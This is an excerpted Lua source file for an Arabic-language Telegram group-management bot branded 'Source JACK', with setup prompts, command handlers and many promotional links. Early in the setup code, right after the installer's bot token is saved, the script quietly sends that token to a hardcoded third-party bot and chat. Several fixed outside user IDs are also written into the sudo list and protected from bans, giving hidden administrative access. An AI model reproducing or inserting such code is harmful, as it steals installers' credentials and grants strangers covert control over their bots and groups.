...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot10386181:AAFMwGkT-vo/sendmessage?chat_id=54545&text=' ..token)
end 
else
print('\27[0;35m𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n\27[0;33;49m')
...
io.write('\27[1;31m 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘"
exit 1
fi
if [ ! $token ]; then
echo "𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘"
...
sudo_users = {SUDO,1756511631,1721540719,1284934171}   
...
var = true 
elseif tonumber(user_id) == tonumber(1721540719) then
var = true    
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠")  
...
local Text = ' ❉تم ارسال الملصق من 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n - '..Name
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطور السورس☎️', url="https://t.me/xx_shico"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_shico&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘' and DevSoFi(msg) then
local Text = [[ 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Source_JACK/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦❉𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠❉⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس جاك ادخل وتابع الجديد](t.me/Source_JACK)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Source_JACK)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ❉ من أحسن السورسات على التليجرام سورس جاك ❉
...
send(msg.chat_id_,0," ❉ الـعـضو  : {["..data.first_name_.."](T.ME/Source_JACK)}\n ❉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
{{text = 'صاحب السورس',url="t.me/xx_shico"}},
{{text = 'مطور السورس',url="t.me/Oo_Tiger"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠',url="t.me/Source_JACK"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 𖠪 اهلا بك في سورس جاك الجمدان 𖠪
...
if text == 'شيكو'  then
local Text = [[
شيكو مطور سورس جاك للتواصل معه اتبع الزر الاسفل ⬇️.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'SH. Y. C. O. ⛧✹ ⃝⃙🇲🇩',url="t.me/xx_shico"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠',url="t.me/Source_JACK"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'تيجر'  then
  ...
  keyboard = {} 
  keyboard.inline_keyboard = {
    {{text = 'مطور سورس',url="t.me/Oo_Tiger"}},
  {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
  }
  local msg_id = msg.id_/2097152/0.5
  https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xx_shico&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if text == 'العالمي'  then
local Text = [[
العالمي مطور سورس جاك للتواصل معه اتبع الزر الاسفل ⬇️.
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/j333x&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[ 
مطورين ومبرمجين سورس جاك اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/xx_shico"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠' then
local Text = [[ 
 ❉من أحسن السورسات على التليجرام سورس جاك ❉
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ❉𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠❉](http://t.me/Source_JACK)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ', url="t.me/Source_JACK"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK/84&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'التواصل'  then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/ww_shico_Bot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_shico/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
❉ روايات ← لعرض الميزه
❉ ثيم ← لعرض الميزه
❉ تصميم جاك← لعرض الميزه
❉ غنيلي بفيديو← لعرض الميزه
❉ همسه ← لعرض الميزه
❉ معني + اسمك ← لعرض الميزه
❉ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❉ 𝘾𝙃 - [𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠](t.me/Source_JACK) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽ᯓ『𝒎.𝒊𝒃𝒓𝒂𝒉𝒊𝒎 ‏. 』𓆃₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
{{text = '❨  𖣘• ⁽𝙅𝘼𝘾𝙆 𓃠₎ •𖣘 ❩', url="t.me/Source_JACK"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK/83/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if tonumber(result.sender_user_id_) == tonumber(1756511631) then  
...
if result.id_ == tonumber(1756511631) then
...
if tonumber(userid) == tonumber(1756511631) then  
send(msg.chat_id_, msg.id_, " ❉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
t = "\n ❉ قائمه زوجات الجروب \n ❉═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
' }\nء⧬━┅┅┄⟞❲[❉𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠❉](t.me/Source_JACK)❳⟝┄┉┉━⧬'..
'\n ❉  علامة ال {✓} تعني مفعل'..
'\n ❉  علامة ال {✘} تعني معطل'..
'\nء𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘'..
'\n'..' ❉  امر صيح  ⇇{ '..kickme..
...
' }\n'..' ❉  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ❉  الرفع  ⇇{ '..setadd..
' }\n'..' ❉  الحظر  ⇇{ '..banm..' }\n\n ❉═───═❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)❳═───═ ❉\n ❉ قناة سورس جاك𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\n [ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)❳](t.me/Source_JACK) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘ٴ\n ❉ ❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)❳ ❉ ')
end
...
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس جاكو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'جاك غني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قمر' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Source_JACK/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Source_JACK/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه شيكو ') 
return false
end
...
[[
↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ❉  
↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast ❉  
↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𝙈𝘼𝙎𝙂 ➱ #msgs ❉  
↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝@Source_JACK↜ ❉  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
[🎯ألعاب سورس جاك الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘
 اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘
ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖣘
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠 ](t.me/Source_JACK)❳ 
]]
keyboard = {} 
...
{
{text = '𝙅𝘼𝘾𝙆 𓃠', url="t.me/Source_JACK"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
{{text = 'عقاب', callback_data="/help42"}},
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝙅𝘼𝘾𝙆 𓃠', url="t.me/Source_JACK"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
